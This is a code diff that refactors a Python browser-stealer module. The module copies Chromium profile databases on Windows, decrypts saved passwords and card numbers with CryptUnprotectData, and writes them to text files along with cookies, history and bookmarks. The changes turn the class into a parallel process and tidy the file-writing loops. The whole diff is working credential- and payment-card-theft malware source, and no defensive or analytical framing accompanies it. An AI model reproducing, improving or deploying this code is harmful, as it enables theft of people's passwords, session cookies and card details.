@@ -3,6 +3,7 @@ from shutil import copyfile
 from base64 import b64decode
 from json import loads, dump
 from re import compile, findall
+from multiprocessing import Process
 from datetime import datetime, timedelta
 from os import path, makedirs, remove, listdir
 
@@ -12,14 +13,17 @@ from win32.win32crypt import CryptUnprotectData
 from ..utils.config import ChromiumConfig
 
 
-class Chromium:
+class Chromium(Process):
 
     def __init__(self, *args):
+        Process.__init__(self)
 
         self.config = ChromiumConfig()
 
         for index, variable in enumerate(self.config.Variables):
             self.__dict__.update({variable: args[index]})
+
+        self.path = rf"{self.storage_path}\Browsers\{self.browser_name}"
 
     def _get_profiles(self):
 
@@ -60,28 +64,27 @@ class Chromium:
 
         passwords_list = args[1].execute(self.config.PasswordsSQL).fetchall()
 
-        if len(passwords_list) < 1:
+        if not passwords_list:
             return
 
-        with open(rf"{self.storage_path}\Browsers\{self.browser_name}\{args[0]} Passwords.txt", "a", encoding="utf-8") as passwords:
-            for result in passwords_list:
+        data = self.config.PasswordsData
+        temp = [
+            data.format(result[0], result[1], self._decrypt(result[2], args[2]))
+            for result in passwords_list
+        ]
 
-                password = self._decrypt(result[2], args[2])
-                passwords.write(f"URL: {result[0]}\nUsername: {result[1]}\nPassword: {password}\n\n")
-
-        passwords.close()
+        with open(rf"{self.path}\{args[0]} Passwords.txt", "a", encoding="utf-8") as passwords:
+            passwords.write("".join(item for item in temp))
 
     def _write_cookies(self, *args):
 
         cookies_list = args[1].execute(self.config.CookiesSQL).fetchall()
 
-        if len(cookies_list) < 1:
+        if not cookies_list:
             return
 
-        results = []
-
-        for result in cookies_list:
-            results.append({
+        results = [
+            {
                 "creation_utc": result[0],
                 "top_frame_site_key": result[1],
                 "host_key": result[2],
@@ -100,73 +103,62 @@ class Chromium:
                 "source_scheme": result[15],
                 "source_port": result[16],
                 "is_same_party": result[17],
-            })
+            }
+            for result in cookies_list
+        ]
 
-        with open(rf"{self.storage_path}\Browsers\{self.browser_name}\{args[0]} Cookies.json", "a", encoding="utf-8") as cookies:
+        with open(rf"{self.path}\{args[0]} Cookies.json", "a", encoding="utf-8") as cookies:
             dump(results, cookies)
-
-        cookies.close()
 
     def _write_cards(self, *args):
 
         cards_list = args[1].execute(self.config.CardsSQL).fetchall()
 
-        if len(cards_list) < 1:
+        if not cards_list:
             return
 
-        with open(rf"{self.storage_path}\Browsers\{self.browser_name}\{args[0]} Cards.txt", "a", encoding="utf-8") as cards:
-            for result in cards_list:
+        data = self.config.CardsData
+        temp = [
+            data.format(result[0], self._decrypt(result[3], args[2]), result[1], result[2])
+            for result in cards_list
+        ]
 
-                number = self._decrypt(result[3], args[2])
-                cards.write(f"Username: {result[0]}\nNumber: {number}\nExpire Month: {result[1]}\nExpire Year: {result[2]}\n\n")
-
-        cards.close()
+        with open(rf"{self.path}\{args[0]} Cards.txt", "a", encoding="utf-8") as cards:
+            cards.write("".join(item for item in temp))
 
     def _write_history(self, *args):
 
         history_list = args[1].execute(self.config.HistorySQL).fetchall()
 
-        if len(history_list) < 1:
+        if not history_list:
             return
 
-        with open(rf"{self.storage_path}\Browsers\{self.browser_name}\{args[0]} History.txt", "a", encoding="utf-8") as history:
+        temp = []
+        data = self.config.HistoryData
 
-            temp = []
+        for item in history_list:
 
-            for result in history_list:
+            result = args[1].execute(self.config.HistoryLinksSQL % item[0]).fetchone()
+            temp.append(data.format(result[0], result[1], self._get_datetime(result[2])))
 
-                data = args[1].execute(self.config.HistoryLinksSQL % result[0]).fetchone()
-                result = f"URL: {data[0]}\nTitle: {data[1]}\nLast Visit: {self._get_datetime(data[2])}\n\n"
-
-                if result in temp:
-                    continue
-
-                temp.append(result)
-                history.write(result)
-
-        history.close()
+        with open(rf"{self.path}\{args[0]} History.txt", "a", encoding="utf-8") as history:
+            history.write("".join(item for item in list(set(temp))))
 
     def _write_bookmarks(self, *args):
 
-        with open(args[1], "r", encoding="utf-8") as bookmarks:
+        bookmarks_list = sum([self.config.BookmarksRegex.findall(item) for item in args[1].split("{")], [])
 
-            bookmarks_list = bookmarks.read().split("{")
-
-        bookmarks.close()
-
-        results = sum([self.config.BookmarksRegex.findall(item) for item in bookmarks_list], [])
-
-        if len(results) < 1:
+        if not bookmarks_list:
             return
 
-        with open(rf"{self.storage_path}\Browsers\{self.browser_name}\{args[0]} Bookmarks.txt", "a", encoding="utf-8") as bookmarks:
+        data = self.config.BookmarksData
+        temp = [
+            data.format(result[0], result[1])
+            for result in bookmarks_list
+        ]
 
-            for result in results:
-
-                item = f"Title: {result[0]}\nUrl: {result[1]}\n\n"
-                bookmarks.write(item)
-
-        bookmarks.close()
+        with open(rf"{self.path}\{args[0]} Bookmarks.txt", "a", encoding="utf-8") as bookmarks:
+            bookmarks.write("".join(item for item in temp))
 
     def _get_browser_paths(self, profile):
         return (
@@ -225,30 +217,36 @@ class Chromium:
                     if item["status"] is False:
                         continue
 
-                    db = rf"{self.storage_path}\{self.browser_name} {item['name']}.db"
+                    db_format = "" if item["name"] in ["Bookmarks"] else ".db"
+                    db_path = rf"{self.storage_path}\{self.browser_name} {item['name']}{db_format}"
+                    profile_name = profile.replace("\\", "/").split("/")[-1]
 
-                    if path.exists(item["path"]) is True:
-                        copyfile(item["path"], db)
+                    if path.exists(item["path"]):
+                        copyfile(item["path"], db_path)
 
-                    elif item["alt_path"] is not None and path.exists(item["alt_path"]):
-                        copyfile(item["alt_path"], db)
+                    elif item["alt_path"] and path.exists(item["alt_path"]):
+                        copyfile(item["alt_path"], db_path)
 
                     else:
-                        if self.errors is True:
-                            print(f"[{self.browser_name}]: {item['error']}")
+                        if self.errors is True: print(f"[{self.browser_name}]: {item['error']}")
                         return
 
                     if item["name"] in ["Bookmarks"]:
-                        item["method"](profile.replace("\\", "/").split("/")[-1], item["path"])
+                        with open(db_path, "r", encoding="utf-8") as bookmarks:
+                            item["method"](profile_name, bookmarks.read())
+                        bookmarks.close()
 
                     else:
-                        with connect(db) as connection:
+                        with connect(db_path) as connection:
                             connection.text_factory = lambda text: text.decode(errors="ignore")
-                            item["method"](profile.replace("\\", "/").split("/")[-1], connection.cursor(), self._get_key())
-                            connection.cursor().close()
+                            cursor = connection.cursor()
 
-                    connection.close()
-                    remove(db)
+                            item["method"](profile_name, cursor, self._get_key())
+
+                            cursor.close()
+                        connection.close()
+
+                    remove(db_path)
 
                 except Exception as e:
                     if self.errors is True: print(f"[{self.browser_name}]: {repr(e)}")
